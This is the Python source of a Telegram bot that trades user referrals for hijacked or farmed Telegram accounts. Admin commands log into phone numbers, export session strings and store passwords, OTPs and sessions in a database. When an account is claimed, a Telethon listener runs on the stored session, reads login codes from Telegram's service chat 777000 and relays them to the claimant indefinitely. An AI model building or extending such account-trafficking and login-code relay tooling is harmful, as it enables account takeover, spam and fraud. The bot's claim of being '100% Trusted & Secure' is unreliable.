from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, InputMediaPhoto
from pyrogram.enums import ChatMemberStatus, ParseMode
import logging, asyncio, aiosqlite, traceback
from database import *
from config import Config

# Telethon imports
from telethon import TelegramClient, events
from telethon.sessions import StringSession

logger = logging.getLogger(__name__)
_bot_instance = None

DIAMOND_COST = 10

# ---------- CORRECT IMAGE FILE IDs (8 unique images) ----------
MEDIA_MAPPING = {
    "welcome": "AgACAgUAAxkBAAICQGpiIin66ZiZAAE8w5w-TfLrYKGNFwACGhNrG6YuEFcAARIpUDBtUDkACAEAAwIAA3kABx4E",
    "profile": "AgACAgUAAxkBAAICPWpiIWYRTlYmoNtf5YAMo4moOmHrAAIYE2sbpi4QV3bwmESz182zAAgBAAMCAAN5AAceBA",
    "invite": "AgACAgUAAxkBAAICQ2piIurs4zuoexABkKldhri2QX7IAAIcE2sbpi4QV6pQ9mA2CAugAAgBAAMCAAN5AAceBA",
    "rewards": "AgACAgUAAxkBAAICRmpiI3NqRzzURxr0z-kN31yRfRl0AAIdE2sbpi4QV0zq454LY2_PAAgBAAMCAAN5AAceBA",
    "my_rewards": "AgACAgUAAxkBAAICRmpiI3NqRzzURxr0z-kN31yRfRl0AAIdE2sbpi4QV0zq454LY2_PAAgBAAMCAAN5AAceBA",  # same as rewards
    "progress": "AgACAgUAAxkBAAICS2piI_FLgEAGxcCJwxDxOgQXiOVZAAIeE2sbpi4QVxY6hrl6jS5pAAgBAAMCAAN5AAceBA",
    "support": "AgACAgUAAxkBAAICT2piJGMMLPKdjUI9n2N2KqwAAVWZKwACIRNrG6YuEFfJP48Z1gPnlgAIAQADAgADeQAHHgQ",
    "admin": "AgACAgUAAxkBAAICUmpiJLi1RXiYSQWJj2Eg5rcJTBpvAAIjE2sbpi4QV3VpkdHjPokXAAgBAAMCAAN5AAceBA",
    "admin_broadcast": "AgACAgUAAxkBAAICVWpiJQpZB3c0xVHgOpdhbiliInPoAAIkE2sbpi4QVyqn1zaowZUBAAgBAAMCAAN5AAceBA",
}

AUTO_SWITCH_STATE = {}

class BotHandlers:
    def __init__(self, app: Client):
        global _bot_instance
        _bot_instance = app
        self.app = app
        self.pending_sessions = {}
        self.otp_tasks = {}

        # ---------- COMMAND: getfileid ----------
        @app.on_message(filters.command("getfileid") & filters.user(Config.ADMIN_ID))
        async def get_file_id(client, message):
            if message.reply_to_message and message.reply_to_message.photo:
                file_id = message.reply_to_message.photo.file_id
                await message.reply(f"📸 **File ID:**\n`{file_id}`", parse_mode=ParseMode.MARKDOWN)
            else:
                await message.reply("❌ Reply to a photo with `/getfileid`", parse_mode=ParseMode.MARKDOWN)

        # ---------- COMMAND: start ----------
        @app.on_message(filters.command("start"))
        async def start_cmd(client, message):
            user_id = message.from_user.id
            if not await self._is_verified(client, user_id):
                await self._send_force_join_message(client, message)
                return

            # Referral logic
            if len(message.command) > 1:
                ref_param = message.command[1]
                if ref_param.startswith("ref_"):
                    ref_code = ref_param[4:]
                    referrer = await get_user_by_referral_code(ref_code)
                    if referrer and referrer['user_id'] != user_id:
                        success = await add_referral(referrer['user_id'], user_id)
                        if success:
                            diamonds = await get_diamonds(referrer['user_id'])
                            await client.send_message(
                                referrer['user_id'],
                                f"🎉 **New Referral!**\n\n👤 User `{user_id}` just joined.\n💎 +1 diamond! Total: **{diamonds}**",
                                parse_mode=ParseMode.MARKDOWN
                            )
                        else:
                            await client.send_message(referrer['user_id'], "❌ Already referred by someone else.", parse_mode=ParseMode.MARKDOWN)
                    else:
                        if referrer and referrer['user_id'] == user_id:
                            await message.reply("😄 Can't refer yourself!", parse_mode=ParseMode.MARKDOWN)
                        else:
                            await message.reply("❌ Invalid link.", parse_mode=ParseMode.MARKDOWN)

            await get_or_create_user(user_id)
            if user_id not in AUTO_SWITCH_STATE:
                AUTO_SWITCH_STATE[user_id] = False

            # Send welcome screen
            await self._show_screen(client, message, "welcome", user_id, is_edit=False)

        # ---------- CALLBACK QUERY HANDLER ----------
        @app.on_callback_query()
        async def callback_handler(client, callback):
            data = callback.data
            user_id = callback.from_user.id

            if data == "claim_reward":
                diamonds = await get_diamonds(user_id)
                if diamonds < DIAMOND_COST:
                    await callback.answer(f"Need {DIAMOND_COST - diamonds} more diamonds.", show_alert=True)
                    return
                success = await deduct_diamonds(user_id, DIAMOND_COST)
                if not success:
                    await callback.answer("Error deducting diamonds.", show_alert=True)
                    return
                available = await get_available_accounts()
                if not available:
                    await deduct_diamonds(user_id, -DIAMOND_COST)
                    await callback.answer("No accounts available.", show_alert=True)
                    return
                account = await claim_account_for_user(user_id)
                if account:
                    phone = account.get('phone', 'N/A')
                    await callback.message.edit_caption(
                        caption=f"💎 **Account Claimed!**\n\n📱 **Phone Number:** `{phone}`\n\nEnjoy! 🚀",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]]),
                        parse_mode=ParseMode.MARKDOWN
                    )
                    if account.get('session_string'):
                        asyncio.create_task(forward_telegram_otp_telethon(account['id'], user_id, account['session_string']))
                    await callback.answer("✅ Claimed!")
                else:
                    await deduct_diamonds(user_id, -DIAMOND_COST)
                    await callback.answer("Claim failed.", show_alert=True)
                return

            if data == "auto_switch":
                current = AUTO_SWITCH_STATE.get(user_id, False)
                AUTO_SWITCH_STATE[user_id] = not current
                await callback.answer(f"Auto-Switch {'ON' if AUTO_SWITCH_STATE[user_id] else 'OFF'}")
                await self._show_screen(client, callback.message, "welcome", user_id, is_edit=True)
                return

            if data == "copy_link":
                await callback.answer("📋 Copy the link manually from above.", show_alert=True)
                return

            # === NAVIGATION SCREENS ===
            if data in ["welcome", "profile", "invite", "rewards", "progress", "support", "admin", "admin_broadcast", "my_rewards"]:
                await self._show_screen(client, callback.message, data, user_id, is_edit=True)
                await callback.answer()
                return

            if data in ["admin_users", "admin_stats", "admin_settings"]:
                await callback.message.edit_caption(
                    caption="🔧 This feature is under development.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin")]]),
                    parse_mode=ParseMode.MARKDOWN
                )
                await callback.answer()
                return

            if data == "force_check":
                if await self._is_verified(client, user_id):
                    await self._show_screen(client, callback.message, "welcome", user_id, is_edit=True)
                else:
                    await callback.answer("❌ Please join both channel & group first.", show_alert=True)
                return

            await callback.answer("Unknown action.")

        # ---------- ADMIN COMMANDS ----------
        @app.on_message(filters.command("admin") & filters.user(Config.ADMIN_ID))
        async def admin_cmd(client, message):
            await message.reply(
                "🔧 **Admin Commands**\n\n"
                "• `/gensession +91...` – Generate session\n"
                "• `/otp +91... 12345` – Complete OTP\n"
                "• `/addaccount ...` – Add account\n"
                "• `/listaccounts` – List accounts\n"
                "• `/refstats <id>` – User stats\n"
                "• `/available` – Available accounts\n"
                "• `/broadcast <msg>` – Send broadcast\n"
                "• `/getfileid` – Get file ID (reply to photo)",
                parse_mode=ParseMode.MARKDOWN
            )

        @app.on_message(filters.command("gensession") & filters.user(Config.ADMIN_ID))
        async def gen_session_cmd(client, message):
            parts = message.text.split()
            if len(parts) != 2:
                await message.reply("Usage: /gensession +91...", parse_mode=ParseMode.MARKDOWN)
                return
            phone = parts[1]
            if message.from_user.id in self.pending_sessions:
                await message.reply("Already generating.", parse_mode=ParseMode.MARKDOWN)
                return
            temp_client = Client(f"temp_{message.from_user.id}", api_id=Config.API_ID, api_hash=Config.API_HASH, in_memory=True)
            await message.reply(f"Sending OTP to {phone}...", parse_mode=ParseMode.MARKDOWN)
            try:
                await temp_client.connect()
                sent_code = await temp_client.send_code(phone)
                self.pending_sessions[message.from_user.id] = {"client": temp_client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
                await message.reply(f"OTP sent. Use /otp {phone} <code>", parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await message.reply(f"Failed: {e}", parse_mode=ParseMode.MARKDOWN)

        @app.on_message(filters.command("otp") & filters.user(Config.ADMIN_ID))
        async def complete_otp_cmd(client, message):
            parts = message.text.split()
            if len(parts) != 3:
                await message.reply("Usage: /otp +91... 12345", parse_mode=ParseMode.MARKDOWN)
                return
            phone, otp_code = parts[1], parts[2]
            session_data = self.pending_sessions.get(message.from_user.id)
            if not session_data:
                await message.reply("No pending session.", parse_mode=ParseMode.MARKDOWN)
                return
            if session_data["phone"] != phone:
                await message.reply(f"Mismatch. Expected {session_data['phone']}", parse_mode=ParseMode.MARKDOWN)
                return
            temp_client = session_data["client"]
            try:
                await temp_client.sign_in(phone, otp_code, session_data["phone_code_hash"])
                session_string = await temp_client.export_session_string()
                await temp_client.disconnect()
                del self.pending_sessions[message.from_user.id]
                await message.reply(f"✅ Session:\n`{session_string}`", parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await message.reply(f"Failed: {e}", parse_mode=ParseMode.MARKDOWN)

        @app.on_message(filters.command("addaccount") & filters.user(Config.ADMIN_ID))
        async def add_account_cmd(client, message):
            parts = message.text.split(maxsplit=5)
            if len(parts) < 6:
                await message.reply("Usage: /addaccount <phone> <pass> <otp> <session> <desc>", parse_mode=ParseMode.MARKDOWN)
                return
            phone, password, otp, session_str, desc = parts[1], parts[2], parts[3], parts[4], parts[5]
            acc_id = await add_account(phone, password, otp, session_str, 0, desc)
            await message.reply(f"✅ Account #{acc_id} added!", parse_mode=ParseMode.MARKDOWN)

        @app.on_message(filters.command("updateotp") & filters.user(Config.ADMIN_ID))
        async def update_otp_cmd(client, message):
            parts = message.text.split()
            if len(parts) != 3:
                await message.reply("Usage: /updateotp <id> <new_otp>", parse_mode=ParseMode.MARKDOWN)
                return
            acc_id, new_otp = int(parts[1]), parts[2]
            await update_account_otp(acc_id, new_otp)
            await message.reply(f"Updated.", parse_mode=ParseMode.MARKDOWN)

        @app.on_message(filters.command("listaccounts") & filters.user(Config.ADMIN_ID))
        async def list_accounts_cmd(client, message):
            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute("SELECT * FROM accounts ORDER BY id")
                rows = await cursor.fetchall()
                if not rows:
                    await message.reply("No accounts.", parse_mode=ParseMode.MARKDOWN)
                    return
                text = "📋 All Accounts\n"
                for r in rows:
                    status = "✅ Sold" if r['is_sold'] else "⬜ Avail"
                    text += f"#{r['id']} | {r['phone']} | {status}\n"
                await message.reply(text, parse_mode=ParseMode.MARKDOWN)

        @app.on_message(filters.command("refstats") & filters.user(Config.ADMIN_ID))
        async def ref_stats_cmd(client, message):
            parts = message.text.split()
            if len(parts) != 2:
                await message.reply("Usage: /refstats <user_id>", parse_mode=ParseMode.MARKDOWN)
                return
            uid = int(parts[1])
            diamonds = await get_diamonds(uid)
            count = await get_referral_count(uid)
            accounts = await get_earned_accounts(uid)
            await message.reply(
                f"📊 User {uid}\n💎 Diamonds: {diamonds}\n👥 Referrals: {count}\n📱 Accounts: {len(accounts)}",
                parse_mode=ParseMode.MARKDOWN
            )

        @app.on_message(filters.command("broadcast") & filters.user(Config.ADMIN_ID))
        async def broadcast_cmd(client, message):
            if message.reply_to_message:
                text = message.reply_to_message.text or message.reply_to_message.caption
                if not text:
                    await message.reply("❌ No text.", parse_mode=ParseMode.MARKDOWN)
                    return
            else:
                parts = message.text.split(maxsplit=1)
                if len(parts) < 2:
                    await message.reply("Usage: /broadcast <message>", parse_mode=ParseMode.MARKDOWN)
                    return
                text = parts[1]

            users = await get_all_users()
            total = len(users)
            if total == 0:
                await message.reply("No users.", parse_mode=ParseMode.MARKDOWN)
                return

            status_msg = await message.reply(f"📢 Broadcasting to {total} users...", parse_mode=ParseMode.MARKDOWN)
            sent = 0
            failed = 0

            for i, user_id in enumerate(users):
                try:
                    await client.send_message(user_id, text)
                    sent += 1
                except:
                    failed += 1
                if (i + 1) % 5 == 0 or (i + 1) == total:
                    await status_msg.edit_text(
                        f"📢 Progress: {i+1}/{total}\n✅ Sent: {sent}\n❌ Failed: {failed}",
                        parse_mode=ParseMode.MARKDOWN
                    )
                await asyncio.sleep(0.2)

            await status_msg.edit_text(
                f"✅ Broadcast Done!\n✅ Sent: {sent}\n❌ Failed: {failed}",
                parse_mode=ParseMode.MARKDOWN
            )

    # ==================== HELPER METHODS ====================

    async def _show_screen(self, client, target, screen, user_id, is_edit=True):
        """Show screen – edits existing message, never sends new one on button click."""
        diamonds = await get_diamonds(user_id)
        is_admin = (user_id == Config.ADMIN_ID)
        count = await get_referral_count(user_id)
        earned = await get_earned_accounts(user_id)

        captions = {
            "welcome": (
                "🌟 **Welcome to ASCEND** 🌟\n\n"
                "💎 Earn **Telegram Accounts** by inviting friends!\n"
                "🔥 **1 Referral = 1 Diamond**\n"
                f"🎁 **{DIAMOND_COST} Diamonds = 1 Account**\n"
                "💯 **100% Trusted & Secure**\n\n"
                f"💎 **Your Diamonds:** `{diamonds}`\n"
                f"🎯 **Next account in:** `{DIAMOND_COST - (diamonds % DIAMOND_COST)}` diamond(s)"
            ),
            "profile": (
                "👤 **Your Profile**\n\n"
                f"💎 **Diamonds:** `{diamonds}`\n"
                f"👥 **Referrals:** `{count}`\n"
                f"📱 **Accounts Earned:** `{len(earned)}`\n"
                f"🎯 **Next account:** `{DIAMOND_COST - (diamonds % DIAMOND_COST)}` diamond(s)"
            ),
            "invite": (
                "🔗 **Your Invite Link**\n\n"
                "📤 Share this link with your friends:\n"
                "`https://t.me/{}?start=ref_{}`\n\n"
                "💎 Each referral gives you **1 diamond**."
            ),
            "rewards": (
                "🎁 **Rewards**\n\n"
                "Complete tasks and invite more to unlock exclusive rewards.\n"
                "💎 **More invites = More rewards!**"
            ),
            "my_rewards": (
                "📱 **My Rewards**\n\n"
                "Here are your claimed accounts:\n\n"
                f"{self._format_earned_accounts(earned)}"
            ),
            "progress": (
                "📊 **Your Progress**\n\n"
                f"💎 **Diamonds:** `{diamonds}`\n"
                f"🎯 **Target:** `{DIAMOND_COST}` diamonds for 1 account\n"
                f"📈 **Progress:** `{diamonds}/{DIAMOND_COST}`\n"
                f"📊 **Referrals:** `{count}`\n\n"
                f"💪 Keep going! You're doing great!"
            ),
            "support": (
                "🆘 **Support**\n\n"
                "Facing any issue? We are here to help you.\n"
                "Click the button below to contact support."
            ),
            "admin": (
                "🔧 **Admin Panel**\n\n"
                "Select an option below."
            ),
            "admin_broadcast": (
                "📢 **Broadcast**\n\n"
                "Send a message to all users.\n"
                "Use: `/broadcast <message>`\n"
                "Or reply to a message with `/broadcast`."
            ),
        }

        # ---- Build keyboard ----
        keyboard = []
        if screen == "welcome":
            keyboard = [
                [InlineKeyboardButton("👤 Profile", callback_data="profile")],
                [InlineKeyboardButton("🔗 Invite", callback_data="invite")],
                [InlineKeyboardButton("🎁 Rewards", callback_data="rewards")],
                [InlineKeyboardButton("📊 Progress", callback_data="progress")],
                [InlineKeyboardButton("🆘 Support", callback_data="support")]
            ]
            if diamonds >= DIAMOND_COST:
                keyboard.insert(0, [InlineKeyboardButton("💎 Claim Account", callback_data="claim_reward")])
            if is_admin:
                keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin")])
            state = "ON" if AUTO_SWITCH_STATE.get(user_id, False) else "OFF"
            keyboard.append([InlineKeyboardButton(f"🔄 Auto-Switch {state}", callback_data="auto_switch")])

        elif screen == "profile":
            keyboard = [[InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]]

        elif screen == "invite":
            user = await get_or_create_user(user_id)
            bot_username = (await client.get_me()).username
            captions["invite"] = captions["invite"].format(bot_username, user['referral_code'])
            keyboard = [
                [InlineKeyboardButton("📋 Copy Link", callback_data="copy_link")],
                [InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]
            ]

        elif screen == "rewards":
            keyboard = [
                [InlineKeyboardButton("📱 My Rewards", callback_data="my_rewards")],
                [InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]
            ]

        elif screen == "my_rewards":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="rewards")]]

        elif screen == "progress":
            keyboard = [[InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]]

        elif screen == "support":
            support_btn = []
            if Config.SUPPORT_ID:
                support_btn = [InlineKeyboardButton("📩 Contact Support", url=f"tg://user?id={Config.SUPPORT_ID}")]
            keyboard = [support_btn, [InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]] if support_btn else [[InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]]

        elif screen == "admin":
            keyboard = [
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
                [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
                [InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")],
                [InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]
            ]

        elif screen == "admin_broadcast":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin")]]

        else:
            keyboard = [[InlineKeyboardButton("🔙 Back to Home", callback_data="welcome")]]

        caption = captions.get(screen, "")
        image_id = MEDIA_MAPPING.get(screen)

        if not image_id:
            logger.error(f"No image ID for screen: {screen}")
            image_id = MEDIA_MAPPING["welcome"]

        # ---- Send or Edit ----
        try:
            if is_edit:
                # Editing existing message – try to edit media
                try:
                    await target.edit_message_media(
                        media=InputMediaPhoto(media=image_id, caption=caption, parse_mode=ParseMode.MARKDOWN),
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                except Exception as e:
                    # If media edit fails (e.g., original message is text), fallback to text edit
                    logger.warning(f"Media edit failed, editing text: {e}")
                    await target.edit_text(
                        text=caption,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.MARKDOWN
                    )
            else:
                # First time – try to send photo, fallback to text
                try:
                    await target.reply_photo(
                        photo=image_id,
                        caption=caption,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception as e:
                    logger.warning(f"Photo send failed, sending text: {e}")
                    await target.reply(
                        text=caption,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.MARKDOWN
                    )
        except Exception as e:
            logger.error(f"Error showing screen: {e}")
            # Ultimate fallback – edit text if possible, else send new
            try:
                await target.edit_text(
                    text=caption + "\n\n⚠️ Error loading screen.",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                await target.reply(
                    text=caption + "\n\n⚠️ Error loading screen.",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.MARKDOWN
                )

    def _format_earned_accounts(self, accounts):
        if not accounts:
            return "You haven't claimed any account yet."
        lines = []
        for acc in accounts:
            phone = acc.get('phone', 'N/A')
            masked = phone[:4] + "****" + phone[-4:] if len(phone) > 8 else phone
            lines.append(f"🔹 ID: `{acc['id']}` | {masked}")
        return "\n".join(lines)

    async def _is_verified(self, client, user_id):
        try:
            if Config.FORCE_CHANNEL:
                try:
                    member = await client.get_chat_member(f"@{Config.FORCE_CHANNEL}", user_id)
                    if member.status not in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                        return False
                except:
                    return False
            if Config.FORCE_GROUP:
                try:
                    member = await client.get_chat_member(f"@{Config.FORCE_GROUP}", user_id)
                    if member.status not in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                        return False
                except:
                    return False
            return True
        except:
            return False

    async def _send_force_join_message(self, client, message):
        text = "🔐 **Verification Required**\n\nJoin our Channel & Group below:\n\nAfter joining, click **'I have joined'**."
        buttons = []
        if Config.FORCE_CHANNEL:
            buttons.append([InlineKeyboardButton("📢 Channel", url=f"https://t.me/{Config.FORCE_CHANNEL}")])
        if Config.FORCE_GROUP:
            buttons.append([InlineKeyboardButton("👥 Group", url=f"https://t.me/{Config.FORCE_GROUP}")])
        buttons.append([InlineKeyboardButton("✅ I have joined", callback_data="force_check")])
        await message.reply(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=ParseMode.MARKDOWN)


# ---------- OTP FORWARDER (PERMANENT) ----------
async def forward_telegram_otp_telethon(account_id: int, buyer_id: int, session_string: str):
    if not session_string or len(session_string) < 10:
        await _bot_instance.send_message(buyer_id, "❌ Invalid session string.", parse_mode=ParseMode.MARKDOWN)
        return
    logger.info(f"OTP listener started for account {account_id}")
    await _bot_instance.send_message(
        buyer_id,
        "🔁 **OTP listener active (no timeout).**\n\n📱 Open Telegram app, enter phone, press 'Next'.\n🔑 OTP will appear here.",
        parse_mode=ParseMode.MARKDOWN
    )
    client = TelegramClient(StringSession(session_string), Config.API_ID, Config.API_HASH, connection_retries=3, retry_delay=1)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await _bot_instance.send_message(buyer_id, "❌ Session invalid.", parse_mode=ParseMode.MARKDOWN)
            return
        @client.on(events.MessageEdited(chats=777000))
        @client.on(events.NewMessage(chats=777000))
        async def otp_handler(event):
            if event.message.text and ("login code" in event.message.text.lower() or "code" in event.message.text.lower()):
                await _bot_instance.send_message(buyer_id, f"🔑 **OTP Received:**\n\n`{event.message.text}`", parse_mode=ParseMode.MARKDOWN)
        await client.start()
        try:
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            logger.info(f"Listener cancelled for account {account_id}")
            raise
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.error(f"OTP error: {traceback.format_exc()}")
        await _bot_instance.send_message(buyer_id, f"❌ OTP listener crashed. Click 'Get OTP' to restart.", parse_mode=ParseMode.MARKDOWN)
    finally:
        try:
            await client.disconnect()
        except:
            pass
